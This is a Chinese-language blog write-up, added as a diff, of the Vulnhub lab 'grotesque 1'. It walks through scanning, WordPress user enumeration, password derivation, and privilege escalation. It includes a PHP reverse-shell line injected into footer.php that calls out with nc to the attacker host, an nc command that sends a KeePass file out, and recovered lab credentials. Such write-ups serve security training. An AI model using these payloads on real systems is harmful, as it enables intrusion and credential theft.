@@ -1,0 +1,183 @@
+---
+layout: post
+title: grotesque 1
+subtitle: grotesque 1
+date: 2023-07-16 15:40
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - Vulnhub
+published: true
+number headings: first-level 2, max 4, 1.1., auto
+---
+
+## 1. 环境搭建
+
+[Vuluhub 靶场 IP 问题 - Kyon-H Blog](https://blog.kyon.xin/2025/07/01/Vuluhub%E9%9D%B6%E5%9C%BAIP%E9%97%AE%E9%A2%98/)
+
+## 2. 信息搜集
+
+搜索 IP，发现主机 `192.168.163.134`
+
+![image.png](https://img.ghostliner.top/3k7JpE.png)
+
+扫描端口发现 66 和 80 两个 http 端口
+
+```shell
+namp -T4 -A -p- 192.168.163.134
+```
+
+![image.png](https://img.ghostliner.top/BRzNRF.png)
+
+扫描目录，发现 80 端口无内容，扫描 66 端口
+
+```shell
+dirsearch -u http://192.168.163.134:66/
+```
+
+![image.png](https://img.ghostliner.top/5eiLQC.png)
+
+访问`changelog.txt`确定`vvmlist`版本为 `16.01.2021`
+
+![image.png](https://img.ghostliner.top/ROdua0.png)
+
+whatweb 扫描网站
+
+![image.png](https://img.ghostliner.top/jDnHct.png)
+
+主页发现链接可以下载项目压缩包： <http://192.168.163.134:66/vvmlist.zip>
+
+解压后打开
+
+发现`sshpasswd.png`图片获取疑似用户名：`mossad`
+
+网站主页发现特殊字符串，分析是`Brainfuck`代码
+
+![image.png](https://img.ghostliner.top/r3vmo9.png)
+
+解码得到 `/sshpasswd.png`
+
+查看项目文件，在 `sense.md` 文件找到提示
+
+![image.png](https://img.ghostliner.top/wrbRpk.png)
+
+访问`/lyricsblog` 发现 wordpress 站点，F12 发现提示，访问到图片
+
+![image.png](https://img.ghostliner.top/5SqyhB.png)
+
+![image.png](https://img.ghostliner.top/5Z2fmd.png)
+
+扫描目录
+
+```shell
+dirsearch -u http://192.168.163.134/lyricsblog/ -e* -i 200
+```
+
+![image.png](https://img.ghostliner.top/FCr09S.png)
+
+发现后台登录地址 `/lyricsblog/wp-login.php`
+
+### 2.1. 获取用户名密码
+
+wpscan 扫描用户名，获取到 `erdalkomurcu`
+
+```shell
+wpscan --url http://192.168.163.134/lyricsblog/ -e u
+# 保存
+echo "erdalkomurcu" > user.txt
+```
+
+浏览站点发现与图片中文字相同的文章
+
+![image.png](https://img.ghostliner.top/5bLaoe.png)
+
+将文章内容保存到 `lyrics.txt` 计算其 MD5 值
+
+![image.png](https://img.ghostliner.top/EUugLE.png)
+
+转换为大写字符
+
+```shell
+echo "bc78c6ab38e114d6135409e44f7cdda2" | tr 'a-z' 'A-Z'
+# BC78C6AB38E114D6135409E44F7CDDA2
+```
+
+使用用户名：`erdalkomurcu`，密码：`BC78C6AB38E114D6135409E44F7CDDA2` 登陆成功
+
+## 3. 反弹 shell
+
+浏览页面找到可以注入 PHP 代码的位置
+
+![image.png](https://img.ghostliner.top/HVIuKb.png)
+
+在 footer.php 添加反弹 shell 代码
+
+```php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.163.132 4444 >/tmp/f');
+```
+
+![image.png](https://img.ghostliner.top/dPdexr.png)
+
+kali 执行 `nc -lvp 4444` 开启监听，并反弹成功
+
+发现`raphael`用户目录下`user.txt`但无权查看
+
+查找网站配置文件，发现数据库配置
+
+![image.png](https://img.ghostliner.top/IuQs5f.png)
+
+获得用户名：`raphael`，密码：`_double_trouble_`
+
+尝试切换用户，成功
+
+![image.png](https://img.ghostliner.top/A5msB5.png)
+
+查看 `user.txt`文件，发现内容
+
+![image.png](https://img.ghostliner.top/QbUVOK.png)
+
+## 4. root 提权
+
+查看隐藏文件，发现 `.chadroot.kdbx`文件
+
+![image.png](https://img.ghostliner.top/iPoLP3.png)
+
+`.kdbx`为密码管理软件 `KeePass`生成的密码文件后缀名
+
+传输到 kali 进行解密
+
+```shell
+# dc-9
+nc 192.168.163.132 5555 < .chadroot.kdbx
+# kali
+nc -lvp 5555 >keepass
+# 解密
+keepass2john keepass | tee pass.txt
+john pass.txt
+```
+
+![image.png](https://img.ghostliner.top/sl1TsA.png)
+
+![image.png](https://img.ghostliner.top/zcN2b1.png)
+
+解密得到 `chatter`
+
+打开网站[KeeWeb](https://app.keeweb.info/)上传 `keepass`文件，输入密码 `chatter`，得到 4 组 root 密码
+
+![image.png](https://img.ghostliner.top/hf1unI.png)
+
+```
+.:.yarak.:.
+secretservice
+.:.subjective.:.
+rockyou.txt
+```
+
+使用 `.:.subjective.:.` 登录成功
+
+![image.png](https://img.ghostliner.top/SXIzFt.png)
+
+## 5. 获取 flag
+
+![image.png](https://img.ghostliner.top/jFA97D.png)
